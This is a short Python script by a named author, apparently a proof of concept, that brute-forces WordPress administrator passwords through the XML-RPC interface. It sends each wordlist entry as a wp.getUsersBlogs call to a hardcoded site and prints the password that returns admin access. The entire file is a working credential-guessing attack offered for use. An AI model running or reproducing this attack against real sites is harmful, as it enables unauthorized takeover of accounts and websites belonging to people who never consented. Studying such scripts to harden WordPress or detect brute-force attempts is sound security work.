# -*- coding: utf-8 -*-

"""
XMLRPC-Bruteforcer
Author: KORKUT Caner
06-07-2020
Tested on WordPress Core 5.4.1
Usage: python3 xmlrpc_poc.py username wordlist.txt 
"""

import requests
import sys 

f = open(sys.argv[2], "r")
wordlist = f.readlines()
f.close()

for password in wordlist:
	xml = """<?xml version="1.0"?>
	<methodCall>
	<methodName>wp.getUsersBlogs</methodName>
	<params>
	<param>
	<value>{}</value>
	</param>
	<param>
	<value>{}</value>
	</param>
	</params>
	</methodCall>
	""".format(sys.argv[1], password)
	headers = {'Content-Type': 'application/xml'} # set what your server accepts
	rep = requests.post('http://phonebest.ddns.net/xmlrpc.php', data=xml, headers=headers).text
	if "isAdmin" in rep:
		print("Mot de passe: ", password)